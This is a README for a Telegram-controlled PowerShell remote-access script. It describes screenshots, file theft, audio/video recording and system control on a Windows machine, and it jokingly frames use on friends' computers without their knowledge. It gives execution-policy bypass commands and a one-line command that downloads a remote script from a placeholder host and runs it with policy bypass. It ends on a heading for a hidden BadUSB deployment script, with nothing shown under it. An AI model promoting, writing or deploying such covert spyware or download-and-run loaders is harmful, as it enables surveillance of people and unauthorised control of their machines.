# Telegram-Controlled PowerShell Script

**Get persistent remote control access through Telegram commands.**
Don't use it when your friends are away from their computer 🤫
This script allows you to control a Windows system remotely through Telegram, offering various functionalities like taking screenshots, sending files, recording audio/video, locking or restarting the system, and more.

## 🛠 Prerequisites

* Windows 10 or newer
* PowerShell 5 or later (built-in)
* Internet connection
* [ffmpeg](https://ffmpeg.org/download.html) installed and in system PATH (for audio/video recording)
* A Telegram bot token (from [@BotFather](https://t.me/BotFather))
* Your own Telegram user ID (use [@userinfobot](https://t.me/userinfobot))

### 📥 How to Create a Telegram Bot

1. Open Telegram and search for `@BotFather`.
2. Start a conversation and type `/newbot` to create a new bot.
3. Follow the instructions to set a name and username for your bot.
4. After completion, you will receive a **bot token** which you'll use in the script.

## 🔒 Enable Script Execution

Before running the script, allow PowerShell to execute local scripts:

### Powershell (Permanent fix)

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```

### Powershell (One-time fix for your session)

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

### Powershell pipeline

```powershell
iwr 'https://example.com/urfile.ps1' -UseBasicParsing -OutFile $env:TEMP\prankware.ps1; powershell -ep bypass -File $env:TEMP\prankware.ps1
```

### Hidden PowerShell Ducky Script EXAMPLE
